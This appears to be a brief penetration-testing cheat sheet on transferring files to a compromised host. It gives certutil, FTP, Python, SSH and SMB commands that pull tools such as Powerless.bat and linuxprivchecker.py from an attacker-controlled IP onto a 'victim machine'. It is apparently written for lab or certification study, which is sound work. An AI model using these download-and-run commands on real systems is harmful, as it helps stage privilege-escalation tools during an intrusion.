# File Transfers

## Windows

```text
certutil.exe -urlcache -split -f "http://10.11.0.98/Powerless.bat" Powerless.bat
```

## FTP

### Server

```text
pip install pyftpdlib
python -m pyftpdlib -p 21 -w
# On victim machine
ftp anonymous@10.11.0.98
```

### Windows client

```text
ftp -A %ATTACKER_IP%
# switch to binary mode
binary
get <file-name>
```

### Linux Client

```text
ftp $TARGET_IP
```

## Python

\*It seems not working for large binary file.

```text
python -c "import urllib; print urllib.urlopen('http://10.11.0.98/<filename>').read()" > <filename>
```

## SSH

```bash
ssh user@10.11.1.252 "cat > linuxprivchecker.py" < linuxprivchecker.py
```

## SMB

### Server

```bash
smbserver.py a /usr/share/windows-binaries/
```

### Windows client

```bash
C:\> \\10.11.0.x\a\whoami.exe
```

